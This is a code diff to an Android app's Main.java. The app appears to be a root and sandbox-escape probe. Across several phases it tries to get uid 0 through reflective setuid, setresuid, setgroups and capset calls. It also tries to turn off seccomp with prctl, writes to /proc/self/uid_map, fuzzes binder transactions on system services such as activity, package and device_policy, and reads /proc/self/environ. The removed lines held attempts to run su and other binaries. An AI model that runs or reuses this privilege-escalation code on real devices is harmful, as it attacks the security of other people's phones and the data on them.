@@ -55,7 +55,7 @@ public class Main {
         appendLog("========== PHASE 3: File System Exploration ==========");
         exploreDeepFiles();
 
-        appendLog("========== PHASE 4: setuid/setgid 0 Attempts (with seccomp bypass attempts) ==========");
+        appendLog("========== PHASE 4: setuid 0 Bruteforce Attempts ==========");
         attemptSetuid0();
 
         appendLog("========== PHASE 5: Binder Transaction Fuzzing ==========");
@@ -66,12 +66,6 @@ public class Main {
 
         appendLog("========== PHASE 7: /proc/self Exploitation ==========");
         exploitProcSelf();
-
-        appendLog("========== PHASE 8: Attempting exec of suid binaries ==========");
-        execSuidBinaries();
-
-        appendLog("========== PHASE 9: Attempting kernel capset/capget ==========");
-        testCaps();
 
         appendLog("========== ALL TESTS COMPLETED ==========");
         appendLog("========================================");
@@ -291,199 +285,166 @@ public class Main {
     }
 
     private static void attemptSetuid0() {
-        appendLog("[SETUID] Attempting various setuid 0 techniques with seccomp bypass tries...");
+        appendLog("[SETUID] Attempting various setuid 0 techniques...");
 
-        // Try Runtime.setuid (likely blocked)
-        try {
-            Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
-            setuid.setAccessible(true);
-            int result = (int) setuid.invoke(Runtime.getRuntime(), 0);
-            appendLog("  Runtime.setuid(0) returned: " + result);
-        } catch (Exception e) {
-            appendLog("  Runtime.setuid failed: " + e.getMessage());
-        }
-
-        // Try libcore.io.Os.setuid
+        // Try setreuid via libcore.io.Os
         try {
             Class<?> osClass = Class.forName("libcore.io.Os");
-            Method setuidMethod = osClass.getMethod("setuid", int.class);
+            Method setreuidMethod = osClass.getMethod("setreuid", int.class, int.class);
             Class<?> libcore = Class.forName("libcore.io.Libcore");
             Field osField = libcore.getField("os");
             Object os = osField.get(null);
-            setuidMethod.invoke(os, 0);
-            appendLog("  libcore.io.Os.setuid(0) succeeded?");
+            appendLog("  Trying Os.setreuid(0,0)");
+            setreuidMethod.invoke(os, 0, 0);
+            appendLog("  [SUCCESS] Os.setreuid(0,0) succeeded!");
         } catch (Exception e) {
-            appendLog("  libcore.io.Os.setuid failed: " + e.getMessage());
+            appendLog("  Os.setreuid failed: " + e.getMessage());
         }
 
-        // Try android.system.Os.setuid (Android 7+)
+        // Try setresuid via libcore.io.Os
         try {
-            Class<?> osClass = Class.forName("android.system.Os");
-            Method setuidMethod = osClass.getMethod("setuid", int.class);
-            setuidMethod.invoke(null, 0);
-            appendLog("  android.system.Os.setuid(0) succeeded?");
+            Class<?> osClass = Class.forName("libcore.io.Os");
+            Method setresuidMethod = osClass.getMethod("setresuid", int.class, int.class, int.class);
+            Class<?> libcore = Class.forName("libcore.io.Libcore");
+            Field osField = libcore.getField("os");
+            Object os = osField.get(null);
+            appendLog("  Trying Os.setresuid(0,0,0)");
+            setresuidMethod.invoke(os, 0, 0, 0);
+            appendLog("  [SUCCESS] Os.setresuid(0,0,0) succeeded!");
         } catch (Exception e) {
-            appendLog("  android.system.Os.setuid failed: " + e.getMessage());
+            appendLog("  Os.setresuid failed: " + e.getMessage());
         }
 
-        // Try Process.setuid
+        // Try setregid
+        try {
+            Class<?> osClass = Class.forName("libcore.io.Os");
+            Method setregidMethod = osClass.getMethod("setregid", int.class, int.class);
+            Class<?> libcore = Class.forName("libcore.io.Libcore");
+            Field osField = libcore.getField("os");
+            Object os = osField.get(null);
+            appendLog("  Trying Os.setregid(0,0)");
+            setregidMethod.invoke(os, 0, 0);
+            appendLog("  [SUCCESS] Os.setregid(0,0) succeeded!");
+        } catch (Exception e) {
+            appendLog("  Os.setregid failed: " + e.getMessage());
+        }
+
+        // Try setresgid
+        try {
+            Class<?> osClass = Class.forName("libcore.io.Os");
+            Method setresgidMethod = osClass.getMethod("setresgid", int.class, int.class, int.class);
+            Class<?> libcore = Class.forName("libcore.io.Libcore");
+            Field osField = libcore.getField("os");
+            Object os = osField.get(null);
+            appendLog("  Trying Os.setresgid(0,0,0)");
+            setresgidMethod.invoke(os, 0, 0, 0);
+            appendLog("  [SUCCESS] Os.setresgid(0,0,0) succeeded!");
+        } catch (Exception e) {
+            appendLog("  Os.setresgid failed: " + e.getMessage());
+        }
+
+        // Try android.os.Process.setuid (known to be blocked but keep for completeness)
         try {
             Class<?> processClass = Class.forName("android.os.Process");
             Method setuidMethod = processClass.getDeclaredMethod("setuid", int.class);
             setuidMethod.setAccessible(true);
+            appendLog("  Trying Process.setuid(0)");
             int result = (int) setuidMethod.invoke(null, 0);
             appendLog("  Process.setuid(0) returned: " + result);
         } catch (Exception e) {
             appendLog("  Process.setuid failed: " + e.getMessage());
         }
 
-        // Try Process.setgid
+        // Try android.os.Process.setgid
         try {
             Class<?> processClass = Class.forName("android.os.Process");
             Method setgidMethod = processClass.getDeclaredMethod("setgid", int.class);
             setgidMethod.setAccessible(true);
+            appendLog("  Trying Process.setgid(0)");
             int result = (int) setgidMethod.invoke(null, 0);
             appendLog("  Process.setgid(0) returned: " + result);
         } catch (Exception e) {
             appendLog("  Process.setgid failed: " + e.getMessage());
         }
 
-        // Try Process.setgroups
+        // Try Runtime.setuid (deprecated, but try)
+        try {
+            Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
+            setuid.setAccessible(true);
+            appendLog("  Trying Runtime.setuid(0)");
+            int result = (int) setuid.invoke(Runtime.getRuntime(), 0);
+            appendLog("  Runtime.setuid(0) returned: " + result);
+        } catch (Exception e) {
+            appendLog("  Runtime.setuid failed: " + e.getMessage());
+        }
+
+        // Try setgroups to set supplementary groups
         try {
             Class<?> processClass = Class.forName("android.os.Process");
             Method setgroupsMethod = processClass.getDeclaredMethod("setgroups", int[].class);
             setgroupsMethod.setAccessible(true);
             int[] groups = {0};
+            appendLog("  Trying Process.setgroups([0])");
             setgroupsMethod.invoke(null, (Object) groups);
-            appendLog("  Process.setgroups([0]) succeeded?");
+            appendLog("  [SUCCESS] Process.setgroups([0]) succeeded");
         } catch (Exception e) {
             appendLog("  Process.setgroups failed: " + e.getMessage());
         }
 
-        // Try via FileDescriptor introspection (not setuid)
+        // Try capset via libcore.io.Os (if available)
         try {
-            Class<?> fileDescriptor = Class.forName("java.io.FileDescriptor");
-            Field fdField = fileDescriptor.getDeclaredField("fd");
-            fdField.setAccessible(true);
-            int fd = fdField.getInt(java.io.FileDescriptor.in);
-            appendLog("  STDIN_FD = " + fd);
+            Class<?> osClass = Class.forName("libcore.io.Os");
+            Method capsetMethod = osClass.getMethod("capset", long.class, long.class, long.class);
+            Class<?> libcore = Class.forName("libcore.io.Libcore");
+            Field osField = libcore.getField("os");
+            Object os = osField.get(null);
+            appendLog("  Trying Os.capset(0,0,0)");
+            capsetMethod.invoke(os, 0L, 0L, 0L);
+            appendLog("  [SUCCESS] Os.capset succeeded");
+        } catch (NoSuchMethodException e) {
+            appendLog("  Os.capset not available");
         } catch (Exception e) {
-            appendLog("  FD introspection failed: " + e.getMessage());
+            appendLog("  Os.capset failed: " + e.getMessage());
         }
 
-        // Try using prctl to change uid? Not directly accessible.
-        // Try via /proc/self/uid_map and setns (requires user ns)
+        // Try prctl to disable seccomp (PR_SET_SECCOMP) - needs CAP_SYS_ADMIN
+        try {
+            Class<?> osClass = Class.forName("libcore.io.Os");
+            Method prctlMethod = osClass.getMethod("prctl", int.class, int.class, int.class, int.class, int.class);
+            Class<?> libcore = Class.forName("libcore.io.Libcore");
+            Field osField = libcore.getField("os");
+            Object os = osField.get(null);
+            int PR_SET_SECCOMP = 22;
+            int SECCOMP_MODE_FILTER = 2; // but we want to disable? Actually we can't disable, but we can try to set mode to 0? Not possible.
+            appendLog("  Trying prctl(PR_SET_SECCOMP, 0) - may not work");
+            prctlMethod.invoke(os, PR_SET_SECCOMP, 0, 0, 0, 0);
+            appendLog("  prctl succeeded? (unlikely)");
+        } catch (Exception e) {
+            appendLog("  prctl failed: " + e.getMessage());
+        }
+
+        // Try to write to /proc/self/uid_map to set uid 0 (requires user namespace)
         try {
             File uidMap = new File("/proc/self/uid_map");
             if (uidMap.exists() && uidMap.canWrite()) {
+                appendLog("  Trying to write to /proc/self/uid_map");
                 try (FileOutputStream fos = new FileOutputStream(uidMap)) {
                     fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
                     appendLog("  Wrote to uid_map");
                 } catch (Exception e) {
                     appendLog("  uid_map write failed: " + e.getMessage());
                 }
+            } else {
+                appendLog("  /proc/self/uid_map not writable");
             }
         } catch (Exception e) {
             appendLog("  uid_map error: " + e.getMessage());
         }
-
-        // Try writing to /proc/self/setgroups to allow setgroups
-        try {
-            File setgroups = new File("/proc/self/setgroups");
-            if (setgroups.exists() && setgroups.canWrite()) {
-                try (FileOutputStream fos = new FileOutputStream(setgroups)) {
-                    fos.write("allow".getBytes(StandardCharsets.UTF_8));
-                    appendLog("  /proc/self/setgroups write succeeded");
-                } catch (Exception e) {
-                    appendLog("  /proc/self/setgroups write failed: " + e.getMessage());
-                }
-            }
-        } catch (Exception e) {
-            appendLog("  setgroups error: " + e.getMessage());
-        }
-
-        // Try using UserHandle? Not setuid.
-    }
-
-    private static void execSuidBinaries() {
-        appendLog("[EXEC] Trying to execute suid binaries...");
-        String[] candidates = {
-            "/system/bin/su",
-            "/system/xbin/su",
-            "/system/bin/sh",
-            "/system/bin/run-as",
-            "/system/bin/ping",
-            "/system/bin/busybox"
-        };
-        for (String path : candidates) {
-            File f = new File(path);
-            if (f.exists()) {
-                appendLog("  Found " + path + ", canExecute=" + f.canExecute());
-                try {
-                    Process p = Runtime.getRuntime().exec(new String[]{path, "-c", "id"});
-                    java.io.InputStream is = p.getInputStream();
-                    byte[] buf = new byte[1024];
-                    int len = is.read(buf);
-                    if (len > 0) {
-                        appendLog("    Output: " + new String(buf, 0, len).trim());
-                    }
-                    p.waitFor();
-                } catch (Exception e) {
-                    appendLog("    Exec failed: " + e.getMessage());
-                }
-            }
-        }
-
-        // Try using ProcessBuilder
-        try {
-            ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", "id");
-            pb.redirectErrorStream(true);
-            Process p = pb.start();
-            java.io.InputStream is = p.getInputStream();
-            byte[] buf = new byte[1024];
-            int len = is.read(buf);
-            if (len > 0) {
-                appendLog("  ProcessBuilder sh output: " + new String(buf, 0, len).trim());
-            }
-            p.waitFor();
-        } catch (Exception e) {
-            appendLog("  ProcessBuilder sh failed: " + e.getMessage());
-        }
-    }
-
-    private static void testCaps() {
-        appendLog("[CAPS] Trying capset/capget via reflection...");
-        try {
-            Class<?> libcoreOs = Class.forName("libcore.io.Os");
-            Method capget = libcoreOs.getMethod("capget", int.class, int.class, int.class);
-            Method capset = libcoreOs.getMethod("capset", int.class, int.class, int.class);
-            Class<?> libcore = Class.forName("libcore.io.Libcore");
-            Field osField = libcore.getField("os");
-            Object os = osField.get(null);
-            // capget(0,0,0) maybe?
-            // Need proper header, but just try.
-            try {
-                int ret = (int) capget.invoke(os, 0, 0, 0);
-                appendLog("  capget returned: " + ret);
-            } catch (Exception e) {
-                appendLog("  capget failed: " + e.getMessage());
-            }
-            try {
-                int ret = (int) capset.invoke(os, 0, 0, 0);
-                appendLog("  capset returned: " + ret);
-            } catch (Exception e) {
-                appendLog("  capset failed: " + e.getMessage());
-            }
-        } catch (Exception e) {
-            appendLog("  capset/capget not available: " + e.getMessage());
-        }
-
-        // Try via Process.setCapabilities? Not in Android.
     }
 
     private static void fuzzBinderTransactions() {
         appendLog("[FUZZ] Fuzzing binder transactions on system services...");
-        String[] services = {"activity", "window", "package", "power", "account", "battery", "alarm", "usb", "vibrator", "display", "input", "device_policy", "connectivity", "wifi", "bluetooth"};
+        String[] services = {"activity", "window", "package", "power", "account", "battery", "alarm", "usb", "vibrator", "display", "input", "device_policy"};
         for (String svc : services) {
             try {
                 IBinder binder = ServiceManager.getService(svc);
@@ -581,23 +542,20 @@ public class Main {
         appendLog("[PROC] Trying to read /proc/self/environ...");
         readFileContent("/proc/self/environ");
 
-        appendLog("[PROC] Trying to write to /proc/self/gid_map...");
+        appendLog("[PROC] Trying to write to /proc/self/uid_map...");
         try {
-            File gidMap = new File("/proc/self/gid_map");
-            if (gidMap.exists() && gidMap.canWrite()) {
-                try (FileOutputStream fos = new FileOutputStream(gidMap)) {
+            File uidMap = new File("/proc/self/uid_map");
+            if (uidMap.exists() && uidMap.canWrite()) {
+                try (FileOutputStream fos = new FileOutputStream(uidMap)) {
                     fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
-                    appendLog("  Wrote to gid_map");
+                    appendLog("  Wrote to uid_map");
                 } catch (Exception e) {
-                    appendLog("  gid_map write failed: " + e.getMessage());
+                    appendLog("  uid_map write failed: " + e.getMessage());
                 }
             }
         } catch (Exception e) {
-            appendLog("  gid_map error: " + e.getMessage());
+            appendLog("  uid_map error: " + e.getMessage());
         }
-
-        appendLog("[PROC] Trying to read /proc/self/uid_map...");
-        readFileContent("/proc/self/uid_map");
     }
 
     private static void appendLog(final String msg) {
